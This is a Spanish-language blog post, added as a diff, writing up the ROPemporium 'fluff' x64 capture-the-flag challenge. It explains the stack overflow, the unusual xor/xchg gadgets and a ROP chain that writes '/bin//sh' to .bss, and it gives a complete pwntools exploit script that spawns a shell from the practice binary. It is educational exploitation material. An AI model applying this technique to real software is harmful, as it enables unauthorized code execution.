@@ -1,0 +1,197 @@
+---
+layout: post
+title: WRITEUP, ROPemporium, FLUFF (x64)
+date: 2020-04-22 01:21
+comments: true
+categories: [buffer overflow, CTF, dplastico, exploit dev, exploitdev, pwn, rop, ROPemporium, Sin categoría]
+---
+<!-- wp:paragraph -->
+<p>Hace tiempo que no escribia, pero tenia este post guardado de hace un tiempo, asi que hoy me anime a tomar un par de screenshots y hablar al respecto, ya que me parecio un ejercico super bueno para explicar como funciona ROP, esta vez con algunos gadgets un poco inusuales, asi que con el animo de seguir con lo educativo (que a mi me sirve para aprender) nos lanzamos con este post</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>El challenge esta tomado de ROPemporium, excelente pagina para aprender explotacion con ROP y binarios con DEP escencialmente. De verdad creo que los ejercicios son super y hacerlo sin mirar un writeup ayuda definitivamnete, por lo que si no has hecho el reto FLUFF (o si estas ya haciendo tus primeros ROP) Te recomiendo que lo intentes por ti mismo, definitivamente te servira</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://ropemporium.com/challenge/fluff.html">FLUFF ROPEMPORIUM</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>El challenge podemos ver es un binario de 64 bits (hay una version de 32, pero esta vez hare la de 64) con proteccion NX activada</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":176,"width":597,"height":147} -->
+<figure class="wp-block-image is-resized"><img src="/wp-content/uploads/2020/04/image-1.png" alt="" class="wp-image-176" width="597" height="147" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Podemos observar también las funciones del programa usando gdb (que estare usando para debugear el binario junto con el plugin <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Al ejecutar el programa vemos que espera que ingresemos nuestro input (el cual luego veremos nos llevara a un Buffer Overflow)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":195} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-16.png" alt="" class="wp-image-195" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:image {"id":177} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-2.png" alt="" class="wp-image-177" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Vemos varias funciones con nombres que nos dan pistas de cómo pwnear este binario, pero vamos por lo primero, que tenemos en main? Claramente vemos una llamada a la función pwnme</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":179} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-3.png" alt="" class="wp-image-179" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Chequeamos usando cyclic donde ocurre el overflow y que registros podemos controlar:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":193} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-14.png" alt="" class="wp-image-193" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Comprobamos el offset a RSP, el cual es 40</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":194} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-15.png" alt="" class="wp-image-194" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>La cual podemos observar tiene un Buffer overflow en fgets (no entraré en detalles de buffer overflow esta vez, puedes leer al respecto en este <a href="/tutorial-simple-stack-buffer-overflow/">post</a> , o bien <a href="https://es.wikipedia.org/wiki/Desbordamiento_de_b%C3%BAfer">aca</a>.)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":180} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-4.png" alt="" class="wp-image-180" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Procedemos ahora a buscar funciones para pwnear este binario, una forma seria llamando a system, pero el string de “/bin/sh” no se encuentra disponible para hacer el clasico <a href="https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&amp;-return-to-libc-chaining-tutorial.pdf">ret2libc</a> (o ret2system en este caso)<br>observamos ambas funciones, en UsefulFuction, podemos ver una llamada a system que nos servirá más adelante</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":181} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-5.png" alt="" class="wp-image-181" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Pero en questionableGadgets observamos varios pop y sobre todo un MOV [r10], r11. Esto es importante ya que nos permite copiar la dirección que sea que esté en r11 dentro de la dirección que contiene r10, por lo mismo si encontramos una zona del binario donde escribir (RW) podemos escribir el string de /bin/sh para luego cargarlo en RDI y llamar a system, si aun no has hecho este desafio, te&nbsp; sugiero &nbsp;intentar &nbsp;esta &nbsp;parte &nbsp;por &nbsp;ti &nbsp;mismo, &nbsp;es &nbsp;lo &nbsp;mas entretenido&nbsp;;)<br></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>OK, Estos son los gadgets con los que trabajaremos</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":182} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-6.png" alt="" class="wp-image-182" /><figcaption><br></figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Donde escribir? Buscando podemos descubrir que la sección .bss se puede escribir en 0x601060, trabajamos con esta, podemos chequear permisos y direcciones con  <strong><em>objdump -h fluff</em></strong> </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":185} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-9.png" alt="" class="wp-image-185" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ok, no se ve tan sencillo como unos simples pop, pero podemos observar que podemos mover la dirección&nbsp; de r11 a la dirección&nbsp; que se contiene r10, pero no tenemos como poner ningún valor en R11 (no se ven POP R11 RET o similar)</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":186} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-10.png" alt="" class="wp-image-186" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Tampoco tenemos un POP R10 que nos permita setear el valor de la direccion, pero si podemos controlar el valor de r12 </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":188} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-12.png" alt="" class="wp-image-188" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Nuestro plan para este ROP es el siguiente:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:list -->
+<ul><li>Controlar el valor de r12 con un pop r12  y setearlo a la  <br>dirección&nbsp; de el segmeto .bss</li><li>Setear el valor de R11 a cero usando XOR</li><li>Pasar el valor der R12 a R11 usando XOR</li><li>usar el gadget con la orden XCHG para intercambiar los valores de R10 y R11 (ahora R10 tiene la dirección&nbsp;de .BSS)</li><li>Setear el string de "/bin/sh" a r12 por medio de una instrucción POP R12</li><li> Setear el valor de R11 a cero usando XOR </li><li> Pasar el valor der R12 a R11 usando XOR </li><li>Volver R12 a 0x0 (para no pisarnos con el ultimo XOR BYTE PTR [r10],r12b luego de la instrucción MOV QWORD PTR [r10],r11 en 0x40084e)</li><li>Mover R11 como contenido a la dirección en R10 (en este caso el segmento .bss)</li></ul>
+<!-- /wp:list -->
+
+<!-- wp:paragraph -->
+<p>Suena bien, con la ayuda de pwntools, ropper y la información  en el binario podemos completar el rop:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":192} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-13.png" alt="" class="wp-image-192" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Aca el exploit completo</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>from pwn import *
+
+e = ELF('./fluff')
+r = process("./fluff")
+#gdb.attach(r) #para atachar GDB duh!
+#copiar la bss address a r12
+rop = p64(0x0000000000400832) #pop r12; mov r13d, 0x604060; ret; 
+rop += p64(0x601060) #bss a r12 (pop)
+#poner en cero r11
+rop += p64(0x0000000000400820) #xor x11 x11
+rop += "DPLADPLA" #pop r15
+rop += "DPLADPLA" #pop r14
+#xor moviendo r12 a r11 con xor
+rop += p64(0x000000000040082d)
+rop += "DPLADPLA" #pop r14
+rop += "DPLADPLA" #pop a r12
+#xchg cambiando r11 con r10
+rop += p64(0x000000000040083b) 
+rop += "DPLADPLA" #pop a r15
+#bss queda en r10
+#comenzaomos a escribinr binsh
+#binsh a r12
+rop += p64(0x0000000000400832) #pop r12; mov r13d, 0x604060; ret;
+rop += "/bin//sh" #string de /bin/sh pop a r12
+#r11 a cero
+rop += p64(0x0000000000400820) #xor x11 x11
+rop += "DPLADPLA" #pop r15
+rop += "DPLADPLA" #pop r14
+#r12 a r11
+#xor moviendo r12 a r11 con xor
+rop += p64(0x000000000040082d)
+rop += "DPLADPLA" #pop r14
+rop += p64(0x0000000000000000) #pop a r12
+#move de r11 al contenido de r10
+rop += p64(0x000000000040084c)#move, volver r12 a cero antes
+rop += "DPLADPLA" #pop r15
+rop += "DPLADPLA" #pop r13
+rop += p64(0x0000000000000000) #pop r12 para el xor y que no cambie
+
+#system
+rop += p64(0x00000000004008c3)#pop rdi; ret;
+rop += p64(0x601060)
+rop += p64(e.symbols['system']) #magia de pwntools
+
+payload = "A" * 40
+payload += rop
+r.sendlineafter("&gt;", payload)
+r.interactive()</code></pre>
+<!-- /wp:code -->
+
+<!-- wp:paragraph -->
+<p>Ejecutar y shell ! Espero les haya gustado</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":196} -->
+<figure class="wp-block-image"><img src="/wp-content/uploads/2020/04/image-17.png" alt="" class="wp-image-196" /></figure>
+<!-- /wp:image -->
